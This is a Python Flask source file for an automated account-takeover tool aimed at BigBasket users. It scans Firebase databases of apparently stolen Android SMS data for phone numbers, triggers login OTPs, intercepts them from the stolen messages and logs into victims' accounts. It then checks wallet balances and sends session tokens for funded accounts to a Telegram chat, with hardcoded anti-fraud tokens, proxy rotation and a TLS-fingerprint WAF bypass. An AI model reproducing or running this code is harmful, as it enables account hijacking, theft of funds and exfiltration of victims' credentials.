import os
import sys
import time
import json
import re
import base64
import urllib.parse
import threading
import random
import shutil
import uuid
import tempfile
import requests
try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False
from datetime import datetime
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, redirect, url_for, jsonify, Response
from functools import wraps

# ==========================================
# APP SETUP & CONFIG
# ==========================================
app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "bb-checker-secret")

DASHBOARD_USER = os.environ.get("DASHBOARD_USER", "admin")
DASHBOARD_PASS = os.environ.get("DASHBOARD_PASS", "admin")

TG_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TG_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

DATA_DIR = os.environ.get("DATA_DIR", ".")
if DATA_DIR != ".":
    os.makedirs(DATA_DIR, exist_ok=True)
    for filename in ["links.txt", "usednumbers.txt", "hits.txt", "settings.json", "instances.json"]:
        target_path = os.path.join(DATA_DIR, filename)
        should_copy = not os.path.exists(target_path) or os.path.getsize(target_path) == 0
        if should_copy and os.path.exists(filename):
            shutil.copy2(filename, target_path)

USED_NUMBERS_FILE = os.path.join(DATA_DIR, "usednumbers.txt")
HITS_FILE = os.path.join(DATA_DIR, "hits.txt")
LINKS_FILE = os.path.join(DATA_DIR, "links.txt")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
INSTANCES_FILE = os.path.join(DATA_DIR, "instances.json")
SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

FILE_LOCK = threading.Lock()
LOG_BUFFER = deque(maxlen=500)

ACTIVE_THREADS = {}
RUNNING_FLAGS = {}

STATS = {"total_scanned": 0, "total_hits": 0, "total_errors": 0}
STATS_LOCK = threading.Lock()

BB_CSRF_TOKEN = "eSvtFg.MTQxNjU1MTk1MTQ5NTczODA5NA==.1788890501021.C2TruEGtOPL9Cgy7MjrFGnvbFpWqM1Oc0/jnf99ka0U="
BB_INCOGNIA_TOKEN = "ASgi4co7hh2UhcSyOiv5xKg0fCtjVUzMNzz8FIR4Chb-YbUDajqUM5AL0BF-GECiKsiSh_gv7UZUx2R-3KXQNG2dntv1GUrC2IaAS3jGDfiZgBadV6Lggp7kK1jUJlrmx2xPjcUB1Gelcp_WdczTZq1TAvl534cRYW9S56l9Wlfr4PAlUTmrVwfATpbZ1Qh_pLt890-A5Rg_dDiKT9_d44NwonwohqyK2z_ip7hM6LVjGTfytnJVYHqxiTcd1ENFYHDOayc5U0cy8Ifz27a9BBq-jmorEYu2_U4WA9OYnGvIDJLTphuBjARL-asvMSEN2T54WZFTSc3VPNlXpXiv8wPEMQX1AKe-CEl-83yCzSQQCvspep3b-xjibRKS5V1FUPVzl_oGLWLyjwmKJLqbSYMk1wzpVEZ2iuGcqKhFJfgLQeqRobeB42RxREU1vPExFeTpc1hbqyxnLzipIvw_mRDlsPS2OmKaLBkTAri8SWfjxEuJ-UL0w2eWCM-moP94OPnPGq6wrIUFE6F-WdowYsU9VBBqm2qe0SIty8ofVgwxd_49_OuKp4J_MQxRoGUZ9w3Fwc6xcVuW1e79lSKd4cZBqBHRs9JXhVh6RsjKacSh"

# ==========================================
# LOGGING
# ==========================================
class LogCatcher:
    def __init__(self, original_stdout):
        self.original_stdout = original_stdout
    def write(self, text):
        try:
            self.original_stdout.write(text)
        except UnicodeEncodeError:
            self.original_stdout.write(text.encode('ascii', 'replace').decode('ascii'))
        if text.strip():
            timestamp = datetime.now().strftime("%H:%M:%S")
            LOG_BUFFER.append(f"[{timestamp}] {text.strip()}")
    def flush(self):
        self.original_stdout.flush()

sys.stdout = LogCatcher(sys.stdout)

# ==========================================
# SETTINGS & INSTANCES
# ==========================================
def get_settings():
    defaults = {"proxy": "", "min_alert_amount": 0}
    if not os.path.exists(SETTINGS_FILE):
        return defaults
    try:
        with open(SETTINGS_FILE, "r") as f:
            return {**defaults, **json.load(f)}
    except:
        return defaults

def save_settings(s):
    with open(SETTINGS_FILE, "w") as f:
        json.dump(s, f)

def load_instances():
    if not os.path.exists(INSTANCES_FILE):
        return {}
    try:
        with open(INSTANCES_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_instances(data):
    with open(INSTANCES_FILE, "w") as f:
        json.dump(data, f)

def get_proxy_dict():
    settings = get_settings()
    proxy = settings.get("proxy", "").strip()
    if proxy:
        return {"http": proxy, "https": proxy}
    return None

# ==========================================
# TELEGRAM
# ==========================================
def send_telegram_alert(message):
    if not TG_TOKEN or not TG_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True}
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"[!] Telegram Alert Failed: {e}")

def send_telegram_document(filepath, caption=""):
    if not TG_TOKEN or not TG_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
    try:
        with open(filepath, "rb") as f:
            files = {"document": (os.path.basename(filepath), f)}
            data = {"chat_id": TG_CHAT_ID, "caption": caption, "parse_mode": "HTML"}
            requests.post(url, files=files, data=data, timeout=15)
    except Exception as e:
        print(f"[!] Telegram Document Failed: {e}")

# ==========================================
# FILE HELPERS
# ==========================================
def load_used_numbers():
    with FILE_LOCK:
        try:
            with open(USED_NUMBERS_FILE, "r") as f:
                return set(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            return set()

def save_used_number(num):
    with FILE_LOCK:
        with open(USED_NUMBERS_FILE, "a") as f:
            f.write(f"{num}\n")

def save_hit(entry):
    with FILE_LOCK:
        with open(HITS_FILE, "a") as f:
            f.write(entry + "\n")

def load_links():
    if not os.path.exists(LINKS_FILE):
        return []
    links = []
    with open(LINKS_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            url = line.rstrip("/")
            if not url.startswith("http"):
                url = "https://" + url
            links.append(url)
    return links

# ==========================================
# FIREBASE HELPERS
# ==========================================
def fetch_firebase(url, proxies=None):
    for _ in range(3):
        try:
            res = requests.get(url, timeout=12, proxies=proxies)
            if res.status_code == 200:
                return res.json()
            elif res.status_code >= 500:
                time.sleep(1)
                continue
            else:
                break
        except Exception:
            time.sleep(1)
    return None

def fetch_clients(fb_url, proxies=None):
    return fetch_firebase(f"{fb_url}/clients.json", proxies) or {}

def extract_phone_from_device(device):
    raw = device.get("mobNo", "")
    if not raw or str(raw) in ("", "-", "None"):
        sims = device.get("sims")
        if sims and isinstance(sims, dict):
            sims = list(sims.values())
        if sims and isinstance(sims, list) and len(sims) > 0 and isinstance(sims[0], dict):
            raw = sims[0].get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        raw = device.get("phoneNumber", "")
    if not raw or str(raw) in ("", "-", "None"):
        return ""
    mobile = str(raw).replace("+91", "").replace(" ", "").replace("-", "").strip()
    if len(mobile) != 10 or not mobile.isdigit():
        return ""
    return mobile

_PHONE_PATTERNS = [
    re.compile(r'(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|BSNL)\s+(?:Number|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(?:\+?91[-\s]?)([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
]

def extract_phone_from_sms(text):
    for pattern in _PHONE_PATTERNS:
        m = pattern.search(text)
        if m and m.group(1):
            digits = re.sub(r'[^0-9]', '', m.group(1))
            if len(digits) == 10 and digits[0] in '6789':
                return digits
            if len(digits) == 12 and digits.startswith('91') and digits[2] in '6789':
                return digits[2:]
    return None

def extract_phones_from_messages(fb_url, device_id, proxies=None):
    try:
        data = fetch_firebase(f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=150', proxies)
        if not data or not isinstance(data, dict):
            return []
        phone_numbers = set()
        for msg_key, msg_val in data.items():
            if not msg_val or not isinstance(msg_val, dict):
                continue
            text = str(msg_val.get("message", "") or msg_val.get("body", "") or msg_val.get("text", ""))
            if text.strip():
                phone = extract_phone_from_sms(text)
                if phone:
                    phone_numbers.add(phone)
        return list(phone_numbers)
    except:
        return []

def get_last_message_key(fb_url, device_id, proxies=None):
    try:
        data = fetch_firebase(f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=1', proxies)
        if data and isinstance(data, dict):
            keys = list(data.keys())
            if keys:
                return keys[-1]
    except:
        pass
    return ""

# ==========================================
# BB OTP POLLER — matches JK-BIGBKT-S sender
# ==========================================
def poll_for_bb_otp(fb_url, device_id, last_key, timeout, instance_id, proxies=None):
    start_time = time.time()
    while time.time() - start_time < timeout and RUNNING_FLAGS.get(instance_id, False):
        try:
            data = fetch_firebase(f'{fb_url}/messages/{device_id}.json?orderBy="$key"&limitToLast=20', proxies)
            if data and isinstance(data, dict):
                for msg_key, msg in data.items():
                    if msg_key > last_key and isinstance(msg, dict):
                        text = str(msg.get("message", "") or msg.get("body", "") or msg.get("text", ""))
                        sender = str(msg.get("sender", "") or msg.get("from", "") or msg.get("address", ""))
                        text_lower = text.lower()
                        sender_lower = sender.lower()
                        is_bb = any(kw in sender_lower for kw in ['bigbkt', 'bigbasket', 'bb'])
                        is_bb = is_bb or any(kw in text_lower for kw in ['bigbasket', 'big basket', 'bigbasket login code'])
                        if is_bb or 'login code' in text_lower:
                            match = re.search(r'(?:login\s+code|code)[:\s]*(\d{6})', text, re.IGNORECASE)
                            if not match:
                                match = re.search(r'\b(\d{6})\b', text)
                            if match:
                                return match.group(1)
        except:
            pass
        time.sleep(2)
    return None

# ==========================================
# BIGBASKET API FUNCTIONS
# ==========================================
def bb_build_session(proxies=None):
    if HAS_CFFI:
        s = cffi_requests.Session(impersonate="chrome120")
        if proxies:
            s.proxies.update(proxies)
    else:
        s = requests.Session()
        if proxies:
            s.proxies.update(proxies)
    s.headers.update({
        "User-Agent": "BB Android/v8.38.0/os 11",
        "x-channel": "BB-Android",
        "x-entry-context": "bb-b2c",
        "x-entry-context-id": "100",
        "x-tcp-platform": "native",
        "x-pharma": "true",
        "x-device-id": "2f2cba1f398acd73",
        "x-tracker": str(uuid.uuid4()),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "x-csurftoken": BB_CSRF_TOKEN,
        "incognia-request-token": BB_INCOGNIA_TOKEN
    })
    s.cookies.set("csurftoken", BB_CSRF_TOKEN, domain=".bigbasket.com")
    return s

def bb_send_otp(session, mobile, tag=""):
    try:
        resp = session.post("https://www.bigbasket.com/member-tdl/v3/member/otp/",
                            json={"identifier": mobile, "referrer": "unified_login"}, timeout=12)
        try:
            data = resp.json()
        except Exception:
            err_text = str(resp.text)[:50].replace('\n', ' ')
            print(f"    [!] {tag} OTP Request Failed (Proxy/BB Block): Status {resp.status_code} | {err_text}")
            return None
            
        ref_id = data.get("refId")
        if ref_id:
            return ref_id
        err = data.get("errors", [{}])[0].get("msg", "") if data.get("errors") else ""
        if err:
            print(f"    [!] {tag} OTP Error for {mobile}: {err}")
        return None
    except requests.exceptions.Timeout:
        print(f"    [!] {tag} OTP Request Timeout: Proxy is too slow.")
        return None
    except Exception as e:
        print(f"    [!] {tag} OTP Request Failed: Proxy Connection Error.")
        return None

def bb_verify_otp(session, mobile, otp, ref_id):
    try:
        resp = session.post("https://www.bigbasket.com/member-tdl/v3/member/unified-login/",
                            json={"mobile_no": mobile, "mobile_no_otp": otp, "refId": ref_id}, timeout=12)
        if resp.status_code == 200:
            try:
                return resp.json()
            except:
                pass
        return None
    except:
        return None

def bb_get_wallet(session):
    try:
        resp = session.get("https://www.bigbasket.com/wallet/v1/details", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            csurf = session.cookies.get("csurftoken")
            if csurf:
                session.headers["x-csurftoken"] = urllib.parse.unquote(csurf)
            return data.get("total_balance", 0)
    except:
        pass
    return 0

def bb_get_freecash(session):
    try:
        payload = {
            "freecash_v2_enabled": True,
            "sa_city_ids": [3],
            "sa_ids": [24838, 23959],
            "context": "homepage",
            "page_type": None,
            "channel": "BB-Android"
        }
        resp = session.post("https://www.bigbasket.com/ui-svc/v1/free-cash/", json=payload, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("free_cash", data.get("amount", data.get("freecash", 0)))
    except:
        pass
    return 0

# ==========================================
# CORE PROCESSING
# ==========================================
def process_single_number(phone, fb_url, device_id, instance_id, proxies=None):
    tag = f"[Inst:{instance_id[:4]}][Dev:{device_id}]"
    print(f"🔍 {tag} Checking: {phone}")

    with STATS_LOCK:
        STATS["total_scanned"] += 1

    session = bb_build_session(proxies)

    # Step 1: Send OTP
    ref_id = bb_send_otp(session, phone, tag)
    if not ref_id:
        save_used_number(phone)
        return False

    print(f"📨 {tag} OTP sent to {phone}, polling Firebase...")

    # Step 2: Poll Firebase for OTP
    last_key = get_last_message_key(fb_url, device_id, proxies)
    otp = poll_for_bb_otp(fb_url, device_id, last_key, 45, instance_id, proxies)
    if not otp:
        print(f"⏰ {tag} OTP timeout for {phone}")
        save_used_number(phone)
        return False

    print(f"✅ {tag} Got OTP {otp} for {phone}")

    # Step 3: Verify OTP & Login
    login_data = bb_verify_otp(session, phone, otp, ref_id)
    if not login_data or not login_data.get("bb_token"):
        print(f"❌ {tag} Login failed for {phone}")
        save_used_number(phone)
        return False

    token = login_data["bb_token"]
    m_id_raw = login_data.get("m_id", "")
    vid_raw = login_data.get("visitor_id", "")
    try:
        m_id = base64.b64decode(m_id_raw).decode("utf-8")
    except:
        m_id = m_id_raw
    try:
        vid = base64.b64decode(vid_raw).decode("utf-8")
    except:
        vid = vid_raw

    session.cookies.set("BBAUTHTOKEN", token, domain=".bigbasket.com")
    session.cookies.set("_bb_source", "app", domain=".bigbasket.com")

    # Step 4: Fetch balances
    wallet_bal = bb_get_wallet(session)
    freecash_bal = bb_get_freecash(session)

    # Step 5: Log result
    hit_line = f"+91{phone} | Wallet: Rs{wallet_bal} | FreeCash: Rs{freecash_bal} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    save_hit(hit_line)
    save_used_number(phone)

    is_hit = (wallet_bal > 0 or freecash_bal > 0)

    if is_hit:
        with STATS_LOCK:
            STATS["total_hits"] += 1
        print(f"💰 {tag} HIT! {phone} — Wallet: Rs{wallet_bal}, FreeCash: Rs{freecash_bal}")
        
        # Save session JSON only if there is a balance
        session_data = {
            "bbAuthToken": token,
            "mId": str(m_id),
            "bbVisitorId": str(vid)
        }
        session_file = os.path.join(SESSIONS_DIR, f"{phone}_session.json")
        with open(session_file, "w") as jf:
            json.dump(session_data, jf, indent=2)

        # Check min alert threshold
        settings = get_settings()
        min_amount = float(settings.get("min_alert_amount", 0))
        total_bal = float(wallet_bal) + float(freecash_bal)
        
        if total_bal >= min_amount:
            session_json_str = json.dumps(session_data, indent=2)
            fb_short = fb_url.split("//")[1].split("/")[0] if "//" in fb_url else fb_url
            tg_msg = (
                f"💰 <b>Login Data Export</b>\n\n"
                f"📱 <b>Mobile:</b> {phone}\n"
                f"👛 <b>Wallet:</b> Rs{wallet_bal}\n"
                f"🎁 <b>FreeCash:</b> Rs{freecash_bal}\n"
                f"📟 <b>Device:</b> <code>{device_id}</code>\n"
                f"🔥 <b>DB:</b> {fb_short}\n\n"
                f"<pre><code class=\"language-json\">{session_json_str}</code></pre>"
            )
            send_telegram_alert(tg_msg)
    else:
        print(f"📭 {tag} No balance for {phone} — Wallet: Rs{wallet_bal}, FreeCash: Rs{freecash_bal}")

    return is_hit

def process_device(fb_url, device_id, device_data, instance_id, proxies=None):
    if not RUNNING_FLAGS.get(instance_id, False):
        return

    numbers_to_try = []
    primary = extract_phone_from_device(device_data)
    if primary:
        numbers_to_try.append(primary)

    sms_numbers = extract_phones_from_messages(fb_url, device_id, proxies)
    for n in sms_numbers:
        if n not in numbers_to_try:
            numbers_to_try.append(n)

    if not numbers_to_try:
        return

    used = load_used_numbers()
    fresh = [n for n in numbers_to_try if n not in used]
    if not fresh:
        return

    for mobile in fresh:
        if not RUNNING_FLAGS.get(instance_id, False):
            break
        used = load_used_numbers()
        if mobile in used:
            continue
        process_single_number(mobile, fb_url, device_id, instance_id, proxies)

# ==========================================
# BOT WORKER THREAD
# ==========================================
def bot_worker_thread(instance_id, start_idx, end_idx):
    print(f"[*] Instance {instance_id[:4]} Started (Links: {start_idx}-{end_idx})")
    currently_processing = set()
    executor = ThreadPoolExecutor(max_workers=5)

    while RUNNING_FLAGS.get(instance_id, False):
        try:
            proxies = get_proxy_dict()
            all_links = load_links()

            s_idx = max(0, start_idx - 1)
            e_idx = min(len(all_links), end_idx) if end_idx > 0 else len(all_links)
            valid_links = all_links[s_idx:e_idx]

            if not valid_links:
                print(f"[-] [Inst:{instance_id[:4]}] No links in range {start_idx}-{end_idx}. Waiting...")
                time.sleep(15)
                continue

            print(f"🔄 [Inst:{instance_id[:4]}] Starting scan cycle — {len(valid_links)} Firebase links")

            for idx, fb_url in enumerate(valid_links, 1):
                if not RUNNING_FLAGS.get(instance_id, False):
                    break

                print(f"🔥 [Inst:{instance_id[:4]}] [{idx}/{len(valid_links)}] Scanning: {fb_url.split('//')[1][:30]}...")
                raw_clients = fetch_clients(fb_url, proxies)
                if not raw_clients:
                    print(f"   ↳ Empty or unreachable")
                    continue

                active_count = sum(1 for d in raw_clients.values() if isinstance(d, dict) and d.get("status"))
                print(f"   ↳ Found {len(raw_clients)} devices ({active_count} active)")

                for device_id, device_data in raw_clients.items():
                    if not RUNNING_FLAGS.get(instance_id, False):
                        break
                    if not device_data or not isinstance(device_data, dict):
                        continue
                    if device_id in currently_processing:
                        continue
                    if not device_data.get("status"):
                        continue

                    while len(currently_processing) >= 5 and RUNNING_FLAGS.get(instance_id, False):
                        time.sleep(0.5)

                    if not RUNNING_FLAGS.get(instance_id, False):
                        break

                    currently_processing.add(device_id)

                    def done_cb(future, d_id=device_id):
                        currently_processing.discard(d_id)

                    future = executor.submit(process_device, fb_url, device_id, device_data, instance_id, proxies)
                    future.add_done_callback(done_cb)

            print(f"⏳ [Inst:{instance_id[:4]}] Scan cycle complete. Waiting 10s before next cycle...")
            for _ in range(10):
                if not RUNNING_FLAGS.get(instance_id, False):
                    break
                time.sleep(1)

        except Exception as e:
            print(f"[!] [Inst:{instance_id[:4]}] Worker Error: {e}")
            with STATS_LOCK:
                STATS["total_errors"] += 1
            time.sleep(5)

    executor.shutdown(wait=False)
    print(f"[*] Instance {instance_id[:4]} Stopped")

# ==========================================
# FLASK DASHBOARD
# ==========================================
def check_auth(username, password):
    return username == DASHBOARD_USER and password == DASHBOARD_PASS

def authenticate():
    return Response('Authentication Required', 401, {'WWW-Authenticate': 'Basic realm="BB Dashboard"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

@app.route("/")
@requires_auth
def index():
    settings = get_settings()
    instances = load_instances()
    view_data = []
    for i_id, cfg in instances.items():
        view_data.append({
            "id": i_id,
            "start_idx": cfg.get("start_idx", 1),
            "end_idx": cfg.get("end_idx", 20),
            "running": RUNNING_FLAGS.get(i_id, False)
        })
    return render_template("dashboard.html",
                           instances=view_data,
                           proxy=settings.get("proxy", ""),
                           min_alert_amount=settings.get("min_alert_amount", 0),
                           stats=STATS)

@app.route("/api/instances", methods=["POST"])
@requires_auth
def manage_instances():
    action = request.form.get("action")
    instances = load_instances()

    if action == "add":
        start_idx = int(request.form.get("start_idx", 1))
        end_idx = int(request.form.get("end_idx", 20))
        new_id = str(uuid.uuid4())
        instances[new_id] = {"start_idx": start_idx, "end_idx": end_idx}
        save_instances(instances)

    elif action == "delete":
        inst_id = request.form.get("instance_id")
        if inst_id in instances:
            RUNNING_FLAGS[inst_id] = False
            del instances[inst_id]
            save_instances(instances)
            
    elif action == "auto_divide":
        count = int(request.form.get("instance_count", 1))
        all_links = load_links()
        total_links = len(all_links)
        if total_links > 0 and count > 0:
            for i_id in list(instances.keys()):
                RUNNING_FLAGS[i_id] = False
                del instances[i_id]
            
            chunk_size = total_links // count
            remainder = total_links % count
            
            current_start = 1
            for i in range(count):
                extra = 1 if i < remainder else 0
                current_end = current_start + chunk_size + extra - 1
                if current_start <= total_links:
                    instances[str(uuid.uuid4())] = {"start_idx": current_start, "end_idx": current_end}
                    current_start = current_end + 1
            save_instances(instances)

    return redirect(url_for("index"))

@app.route("/api/toggle_instance", methods=["POST"])
@requires_auth
def toggle_instance():
    inst_id = request.json.get("instance_id")
    action = request.json.get("action")
    instances = load_instances()

    if inst_id not in instances:
        return jsonify({"error": "Instance not found"}), 404

    if action == "start" and not RUNNING_FLAGS.get(inst_id, False):
        RUNNING_FLAGS[inst_id] = True
        cfg = instances[inst_id]
        t = threading.Thread(target=bot_worker_thread, args=(inst_id, cfg["start_idx"], cfg["end_idx"]), daemon=True)
        ACTIVE_THREADS[inst_id] = t
        t.start()
        return jsonify({"status": "started"})

    elif action == "stop" and RUNNING_FLAGS.get(inst_id, False):
        RUNNING_FLAGS[inst_id] = False
        return jsonify({"status": "stopping"})

    return jsonify({"error": "Invalid action or state"}), 400

@app.route("/api/save_settings", methods=["POST"])
@requires_auth
def save_settings_api():
    proxy = request.form.get("proxy", "").strip()
    min_alert = request.form.get("min_alert_amount", "0").strip()
    try:
        min_alert = float(min_alert)
    except:
        min_alert = 0
    settings = get_settings()
    settings["proxy"] = proxy
    settings["min_alert_amount"] = min_alert
    save_settings(settings)
    return redirect(url_for("index"))

@app.route("/api/test_proxy", methods=["POST"])
@requires_auth
def test_proxy():
    proxy = request.form.get("proxy", "").strip()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    
    last_err = ""
    for attempt in range(3):
        try:
            res = requests.get("https://api.ipify.org?format=json", proxies=proxies, timeout=10)
            return jsonify({"status": "success", "ip": res.json().get("ip")})
        except requests.exceptions.Timeout:
            last_err = "Connection timed out"
            time.sleep(1)
        except Exception as e:
            last_err = str(e)
            time.sleep(1)
            
    return jsonify({"status": "error", "message": f"Failed after 3 retries. Last error: {last_err}"})

@app.route("/api/myip")
@requires_auth
def my_ip():
    try:
        res = requests.get("https://api.ipify.org?format=json", timeout=10)
        return jsonify({"ip": res.json().get("ip")})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/logs")
@requires_auth
def view_logs():
    return render_template("logs.html")

@app.route("/api/logs")
@requires_auth
def api_logs():
    return jsonify(list(LOG_BUFFER))

@app.route("/firebases", methods=["GET", "POST"])
@requires_auth
def firebases():
    if request.method == "POST":
        action = request.form.get("action")
        if action == "add":
            new_link = request.form.get("link", "").strip()
            if new_link:
                with open(LINKS_FILE, "a") as f:
                    f.write(f"\n{new_link}")
        elif action == "edit":
            content = request.form.get("content", "")
            with open(LINKS_FILE, "w") as f:
                f.write(content.replace('\r', ''))
        return redirect(url_for("firebases"))

    try:
        with open(LINKS_FILE, "r") as f:
            content = f.read()
    except FileNotFoundError:
        content = ""
    return render_template("firebases.html", content=content)

@app.route("/hits")
@requires_auth
def view_hits():
    try:
        with open(HITS_FILE, "r") as f:
            lines = f.readlines()
            lines.reverse()
    except FileNotFoundError:
        lines = []
    return render_template("hits.html", hits=lines)

if __name__ == "__main__":
    os.makedirs("templates", exist_ok=True)
    if HAS_CFFI:
        print("[+] curl_cffi loaded - Chrome TLS fingerprint active (anti-WAF bypass)")
    else:
        print("[!] curl_cffi NOT installed - using default requests (may get 403 on Railway)")
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
